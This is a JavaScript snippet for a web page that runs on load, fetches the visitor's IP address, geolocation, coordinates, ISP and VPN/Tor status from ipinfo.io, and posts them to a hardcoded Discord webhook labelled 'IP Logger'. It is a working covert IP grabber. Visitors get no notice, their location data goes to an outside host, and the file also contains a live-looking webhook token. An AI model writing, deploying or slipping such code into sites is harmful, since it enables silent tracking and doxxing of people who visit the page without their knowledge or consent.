// Load API Token from config.js
async function getIPInfo() {
    try {
        // Wait for token to be loaded
        await import('./config.js').then(module => {
            const token = module.IPINFO_TOKEN;
            fetch(`https://ipinfo.io/json?token=${token}`)
                .then(response => response.json())
                .then(data => {
                    // Handle missing authentication
                    if (data.readme) {
                        data = {
                            ip: data.ip || "N/A",
                            hostname: data.hostname || "N/A",
                            city: "N/A",
                            region: "N/A",
                            country: "N/A",
                            loc: "N/A",
                            postal: "N/A",
                            timezone: "N/A",
                            org: "N/A",
                            asn: { asn: "N/A", name: "N/A" },
                            company: { name: "N/A" },
                            privacy: { vpn: "N/A", proxy: "N/A", tor: "N/A", hosting: "N/A" },
                            abuse: { name: "N/A", email: "N/A" },
                            domains: { domains: ["N/A"] }
                        };
                    }

                    // Format the message for Discord
                    let message = `
                    **IP:** ${data.ip}
                    **Hostname:** ${data.hostname}
                    **Location:** ${data.city}, ${data.region}, ${data.country}
                    **Coordinates:** ${data.loc}
                    **Timezone:** ${data.timezone}
                    **ASN:** ${data.asn?.asn} (${data.asn?.name})
                    **Company:** ${data.company?.name}
                    **VPN:** ${data.privacy?.vpn}, **Proxy:** ${data.privacy?.proxy}, **Tor:** ${data.privacy?.tor}
                    **Hosting:** ${data.privacy?.hosting}
                    **Abuse Contact:** ${data.abuse?.name}, Email: ${data.abuse?.email}
                    **Domains:** ${data.domains?.domains?.slice(0, 5).join(", ")}
                    `;

                    // Send to Discord Webhook
                    const webhookUrl = "https://discord.com/api/webhooks/1334035398661374014/5VqXRcvWREzsTZKB02ssHEA7DMHJSAO5KWSJ4OWbOzBk8syNYXZYnvlzml9dOsTY6YKc"; // Replace this
                    fetch(webhookUrl, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ username: "IP Logger", content: message })
                    });
                })
                .catch(err => console.error("Error fetching IP info:", err));
        });
    } catch (err) {
        console.error("Error loading config.js:", err);
    }
}

// Execute when page loads
window.onload = getIPInfo;
